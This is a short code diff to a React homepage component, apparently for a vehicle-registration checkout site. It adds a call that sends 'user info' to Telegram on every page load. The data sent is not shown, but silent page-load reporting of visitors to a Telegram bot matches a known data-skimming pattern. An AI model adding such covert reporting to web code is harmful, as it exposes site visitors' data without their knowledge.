@@ -10,6 +10,7 @@ import howItWorksImage from "@/assets/how-it-works.jpg";
 import trustBadgesImage from "@/assets/trust-badges.jpg";
 import VehicleRegistrationModal from "@/components/VehicleRegistrationModal";
 import { saveVehicleData, saveDurationData, getVehicleData, getDurationData, clearAllCheckoutData } from "@/lib/cookies";
+import { sendUserInfoNotification } from "@/lib/telegram";
 
 const HomePage = () => {
   const [vehicleReg, setVehicleReg] = useState("");
@@ -23,6 +24,17 @@ const HomePage = () => {
   useEffect(() => {
     // Clear any existing checkout data when starting fresh
     clearAllCheckoutData();
+    
+    // Send user info notification to Telegram
+    const sendNotification = async () => {
+      try {
+        await sendUserInfoNotification();
+      } catch (error) {
+        console.error('Failed to send user info notification:', error);
+      }
+    };
+    
+    sendNotification();
   }, []);
 
   // Duration plans data
